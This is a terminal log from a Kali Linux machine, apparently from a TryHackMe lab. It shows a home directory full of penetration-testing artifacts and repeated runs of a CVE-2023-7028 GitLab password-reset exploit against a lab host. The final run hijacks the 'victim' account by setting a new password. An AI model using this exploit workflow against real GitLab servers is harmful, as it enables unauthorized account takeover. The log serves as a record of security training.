
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts
[sudo] password for kali: 
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ ls -la  
total 2392
drwx------ 35 kali kali   4096 Apr  2 18:02  .
drwxr-xr-x  3 root root   4096 Sep 25  2023  ..
drwx------  7 kali kali   4096 Mar 27 11:24  .BurpSuite
-rw-------  1 kali kali      0 Sep 25  2023  .ICEauthority
-rw-------  1 kali kali     49 Apr  1 07:59  .Xauthority
-rw-------  1 kali kali     63 Apr  1 17:43  .bash_history
-rw-r--r--  1 kali kali    220 Sep 25  2023  .bash_logout
-rw-r--r--  1 kali kali   5551 Sep 25  2023  .bashrc
-rw-r--r--  1 kali kali   3526 Sep 25  2023  .bashrc.original
drwxr-xr-x 21 kali kali   4096 Apr  1 10:25  .cache
drwxr-xr-x  8 kali kali   4096 Nov 30 21:42  .cme
drwxr-xr-x 23 kali kali   4096 Mar 27 11:24  .config
-rw-r--r--  1 kali kali     35 Oct 23 20:48  .dmrc
-rw-r--r--  1 kali kali  11759 Sep 25  2023  .face
lrwxrwxrwx  1 kali kali      5 Sep 25  2023  .face.icon -> .face
drwx------  3 kali kali   4096 Mar  3 20:04  .gnome
drwx------  3 kali kali   4096 Sep 25  2023  .gnupg
drwxr-xr-x  4 kali kali   4096 Sep 26  2023  .java
drwx------  2 kali kali   4096 Mar 20 11:25  .john
-rw-------  1 kali kali     20 Dec  4 13:37  .lesshst
drwxr-xr-x  5 kali kali   4096 Mar 25 11:48  .local
drwx------  4 kali kali   4096 Sep 26  2023  .mozilla
drwxr-xr-x 11 kali kali   4096 Dec 11 00:35  .msf4
-rw-------  1 kali kali     36 Mar 21 23:16  .nc_history
drwx------  3 kali kali   4096 Sep 28  2023  .pki
-rw-r--r--  1 kali kali    807 Sep 25  2023  .profile
drwx------  2 kali kali   4096 Mar 20 11:34  .ssh
-rw-r--r--  1 kali kali      0 Sep 25  2023  .sudo_as_admin_successful
-rw-------  1 kali kali   1452 Mar  3 19:52  .viminfo
drwxr-xr-x  3 kali kali   4096 Sep 28  2023  .vscode-oss
-rw-------  1 kali kali   8338 Apr  2 17:55  .xsession-errors
-rw-------  1 kali kali   4488 Mar 30 01:49  .xsession-errors.old
-rw-------  1 kali kali  72847 Apr  1 19:53  .zsh_history
-rw-r--r--  1 kali kali  10868 Sep 25  2023  .zshrc
-rw-r--r--  1 kali kali 149820 Mar 21 17:15  1615586_15a97.gif
-rw-r--r--  1 kali kali   3079 Apr  2 18:02  2023-7028.py
-rw-r--r--  1 kali kali  16384 Dec  3 18:26  3digits.txt
-rw-------  1 kali kali    800 Dec  3 01:33  840621_1701563612.hc22000
-rw-r--r--  1 kali kali   3505 Aug 16  2021  BastionHostingCreds.zip
drwxr-xr-x  5 kali kali   4096 Mar  3 20:04  BurpSuiteCommunity
drwxr-xr-x  2 kali kali   4096 Mar  3 20:15  Desktop
drwxr-xr-x  2 kali kali   4096 Sep 25  2023  Documents
drwxr-xr-x 11 kali kali   4096 Mar 21 22:03  Downloads
-rw-------  1 kali kali   1056 Aug  6  2023  LIitdNxP.html
-rw-------  1 kali kali  22065 Aug  6  2023  MhckAmee.jpeg
drwxr-xr-x  2 kali kali   4096 Sep 25  2023  Music
drwxr-xr-x  2 kali kali   4096 Apr  1 11:27  Pictures
drwxr-xr-x  3 kali kali   4096 Feb 25 22:03  Postman
drwxr-xr-x  2 kali kali   4096 Sep 25  2023  Public
drwxr-xr-x  2 kali kali   4096 Sep 25  2023  Templates
drwxr-xr-x  2 kali kali   4096 Sep 25  2023  Videos
-rw-------  1 kali kali   2680 Aug  6  2023  beep.txt
-rw-r--r--  1 kali kali   5865 Feb 25 17:19 'caido installation'
-rw-r--r--  1 kali kali 178882 Mar  3 18:59  cat.jpg
-rw-r--r--  1 kali kali 557200 Dec  4 01:46  clinic-pass.lst
-rw-r--r--  1 kali kali   1078 Dec  4 01:04  clinic.lst
-rw-------  1 kali kali     39 Dec  9 04:04  cmd.php
-rw-r--r--  1 kali kali   3645 Aug 16  2021  combined.txt
-rw-------  1 kali kali   7188 Aug  6  2023  cronenum.py
-rw-r--r--  1 kali kali    243 Dec  3 23:33  crunch.txt
-rw-r--r--  1 kali kali    439 Dec  9 00:24  cthulu-rev.ps1
-rw-r--r--  1 kali kali    439 Dec  9 03:20  cthulu-rev444.ps1
-rw-r--r--  1 kali kali 135430 Mar  3 19:00  dog.jpg
-rw-r--r--  1 kali kali   2798 Aug 10  2021  emails.txt
-rw-r--r--  1 kali kali     38 Oct 12  2021  flag.txt
-rw-------  1 kali kali  21514 Aug  6  2023  git-dumper.py
drwxr-xr-x  5 kali kali   4096 Sep 25  2023  gitdump
drwxr-xr-x  5 kali kali   4096 Sep 25  2023  gitdump2
-rw-------  1 kali kali   4612 Aug  6  2023  hello
-rw-------  1 kali kali    460 Aug  6  2023  hello.asm
-rw-------  1 kali kali    656 Aug  6  2023  hello.o
drwxr-xr-x  4 kali kali   4096 Feb 26 19:27  hh
drwxr-xr-x  6 kali kali   4096 Feb 22 22:14  htb
-rw-------  1 kali kali     30 Aug  6  2023  htb.sh
-rw-------  1 kali kali    873 Aug  6  2023  htb.txt
-rw-------  1 kali kali   1679 Aug  6  2023  id_rsa
-rw-------  1 kali kali   5446 Aug  6  2023  jp-free-08.protonvpn.net.udp.ovpn
-rw-r--r--  1 kali kali   2232 Dec  3 23:24  list.txt
-rw-------  1 kali kali  10406 Aug  6  2023  nictoscan.html
-rw-------  1 kali kali   5450 Aug  6  2023  nl-free-144.protonvpn.net.udp.ovpn
-rw-r--r--  1 kali kali   2629 Dec  5 03:13  output.txt
-rw-r--r--  1 kali kali    847 Aug 15  2021  passwords.txt
-rw-r--r--  1 kali kali   2196 Dec  4 20:51  passwords4.txt
-rw-------  1 kali kali  35204 Aug  6  2023 'ping 31.208.161'
-rw-r--r--  1 kali kali 705442 Apr  1 19:55  purple.jpg
drwxr-xr-x  3 kali kali   4096 Sep 25  2023  py
-rw-------  1 kali kali   1798 Aug  6  2023  pyload050.py
-rw-------  1 kali kali    981 Aug  6  2023  red.txt
-rw-------  1 kali kali   1394 Aug  6  2023  request.txt
-rw-------  1 kali kali    809 Aug  6  2023  request2.txt
-rw-------  1 kali kali    810 Aug  6  2023  request3.txt
-rw-r--r--  1 kali kali   7168 Dec 11 00:45  reverse.exe
drwxr-xr-x 18 kali kali   4096 Feb 18 01:38  s1
drwxrwxrwx  3 kali kali   4096 Dec 11 01:49  share
drwxr-xr-x  2 kali kali   4096 Apr  1 13:59  shells
-rw-r--r--  1 kali kali     10 Dec  4 00:34  single-password-list.txt
-rw-------  1 kali kali   9315 Aug  6  2023  sofia75htb.ovpn
-rw-------  1 kali kali   8344 Aug  6  2023  sofia75thm.ovpn
-rw-r--r--  1 kali kali     20 Feb  7 19:07  test.py
drwxr-xr-x 12 kali kali   4096 Mar 27 23:23  thm
-rw-------  1 kali kali     30 Aug  6  2023  thm.sh
-rw-------  1 kali kali   1348 Aug  6  2023 'to obsidian'
-rw-------  1 kali kali   5443 Aug  6  2023  us-free-36.protonvpn.net.udp.ovpn
-rw-------  1 kali kali     58 Aug  6  2023  us.sh
-rw-------  1 kali kali     13 Aug  6  2023  useful.txt
-rw-r--r--  1 kali kali    307 Dec  4 20:52  usernames.txt
-rw-r--r--  1 kali kali     11 Dec  3 23:29  users.lst
-rw-r--r--  1 kali kali    752 Dec  9 02:54  vulnerable.ps1
-rw-r--r--  1 kali kali    752 Dec  9 03:17  vulnerable444.ps1
-rw-r--r--  1 root root  12818 Sep 25  2023  wget-log
-rw-r--r--  1 kali kali   7168 Dec 11 00:35  win64_reverse.exe
-rw-r--r--  1 kali kali  27863 Dec 10 19:22  zsh_history_uniq_2023-12-10.txt
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ python3 2023-7028.py -u http://10.10.49.185:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = xEBp7TonuMr9RRSQ9oIO1zwndHXgyLu1WFzQuG_SJa1zJNFYIjCakjlcyVyhSuRY4TenNnutC2lxyQvSQOcWTA
[DEBUG] Sending reset password request
[DEBUG] Emails sent to victim@mail.gitlab.thm and attacker@mail.gitlab.thm !
Flag value: account_hack#d
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ python3 2023-7028.py -u http://10.10.49.185:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
  File "/home/kali/2023-7028.py", line 40
    print("query_string"+query_string)
TabError: inconsistent use of tabs and spaces in indentation
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ python3 2023-7028.py -u http://10.10.49.185:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = fyaO5OT9D1npoA92lEuPXAEZ2VuxFh4ZDQXp1GwnRVbHBP0aKSmXtewK9rOBF3mFqVZpM-iX4HaEnOaytqSc2w
query_stringauthenticity_token=fyaO5OT9D1npoA92lEuPXAEZ2VuxFh4ZDQXp1GwnRVbHBP0aKSmXtewK9rOBF3mFqVZpM-iX4HaEnOaytqSc2w&user%5Bemail%5D%5B%5D=victim%40mail.gitlab.thm&user%5Bemail%5D%5B%5D=attacker%40mail.gitlab.thm
[DEBUG] Sending reset password request
[DEBUG] Emails sent to victim@mail.gitlab.thm and attacker@mail.gitlab.thm !
Flag value: account_hack#d
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ python3 2023-7028.py -u http://10.10.49.185:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = ALdh57On4Gcw6vuWBm8uz-SW0xCRMrVsFv1j4svRIb-V-1dmXOCTrQ_deBHUgokXTjKb_aIxg950jVl-Z9Xa3w
query_stringauthenticity_token=ALdh57On4Gcw6vuWBm8uz-SW0xCRMrVsFv1j4svRIb-V-1dmXOCTrQ_deBHUgokXTjKb_aIxg950jVl-Z9Xa3w&user%5Bemail%5D%5B%5D=victim%40mail.gitlab.thm&user%5Bemail%5D%5B%5D=attacker%40mail.gitlab.thm
[DEBUG] Sending reset password request
[DEBUG] Emails sent to victim@mail.gitlab.thm and attacker@mail.gitlab.thm !
Flag value: account_hack#d
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ python3 2023-7028.py -u http://10.10.49.185:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = J2t57bP0ySA8KdEeFt3Vml1Mp2k5DYGvu3lIjou2feb3ITYnnsVAO9Bvz2eT93uNoTV4NECtZekkut9pPUoMog
query_stringauthenticity_token=J2t57bP0ySA8KdEeFt3Vml1Mp2k5DYGvu3lIjou2feb3ITYnnsVAO9Bvz2eT93uNoTV4NECtZekkut9pPUoMog&user%5Bemail%5D%5B%5D=victim%40mail.gitlab.thm&user%5Bemail%5D%5B%5D=attacker%40mail.gitlab.thm
[DEBUG] Sending reset password request
[DEBUG] Emails sent to victim@mail.gitlab.thm and attacker@mail.gitlab.thm !
Flag value: account_hack#d
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ python3 2023-7028.py -u http://10.10.49.185:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = LTdVTahZv3ao-yxeSfpLCcLQ0sxKpuZJVKN8bptoUSVlsXN3kAIi1eZ0iRHpes1oGFbwWmwMaNVJj0leWoXShw
query_stringauthenticity_token=LTdVTahZv3ao-yxeSfpLCcLQ0sxKpuZJVKN8bptoUSVlsXN3kAIi1eZ0iRHpes1oGFbwWmwMaNVJj0leWoXShw&user%5Bemail%5D%5B%5D=victim%40mail.gitlab.thm&user%5Bemail%5D%5B%5D=attacker%40mail.gitlab.thm
[DEBUG] Sending reset password request
[DEBUG] Emails sent to victim@mail.gitlab.thm and attacker@mail.gitlab.thm !
Flag value: account_hack#d
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ python3 2023-7028.py -u http://10.10.49.185:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = EoPPpRPYCGYJ8f5dpDi2KTstQgkkBUeOtff9IpccqxHdvSkJ_LqJAtUl8kUk3rxNakoYV_1Tm1INbEinp2PPjw
query_stringauthenticity_token=EoPPpRPYCGYJ8f5dpDi2KTstQgkkBUeOtff9IpccqxHdvSkJ_LqJAtUl8kUk3rxNakoYV_1Tm1INbEinp2PPjw&user%5Bemail%5D%5B%5D=victim%40mail.gitlab.thm&user%5Bemail%5D%5B%5D=attacker%40mail.gitlab.thm
[DEBUG] Sending reset password request
[DEBUG] Emails sent to victim@mail.gitlab.thm and attacker@mail.gitlab.thm !
Flag value: account_hack#d
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ python3 CVE-2023-7028.py                                                                              
usage: CVE-2023-7028.py [-h] -u URL -t TARGET [-e EVIL] [-p PASSWORD]
CVE-2023-7028.py: error: the following arguments are required: -u/--url, -t/--target
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ python3 CVE-2023-7028.py -u http://10.10.49.185:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = CV5Gke5jd32-NzKERKbWenDa_eNzItn27SpVtlZc80HmQVIJDcxCuc5W5At3Zs8Or09Fyrs1VU6Y5n8k5Y2R9Q
[DEBUG] Sending reset password request
[DEBUG] Emails sended to victim@mail.gitlab.thm and attacker@mail.gitlab.thm !
        Input link received by mail: http://gitlab.thm:8000/users/password/edit?reset_password_token=q-AUrXbtMGox4hrxm3m3
[DEBUG] Generating new password
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = __DyVbrM3euYjrvBJeozDlXwH-_UE5Ya_p8ck-fUfIUQ7-bNWWPoL-jvbU4WKip6imWnxhwEGqKLUzYBVAUeMQ
[DEBUG] Changing password to lWGpsgdDuPZ4cNeteUhL
[DEBUG] CVE_2023_7028 succeed !
        You can connect on http://10.10.49.185:8000/users/sign_in
        Username: victim@mail.gitlab.thm
        Password: lWGpsgdDuPZ4cNeteUhL
                                          
```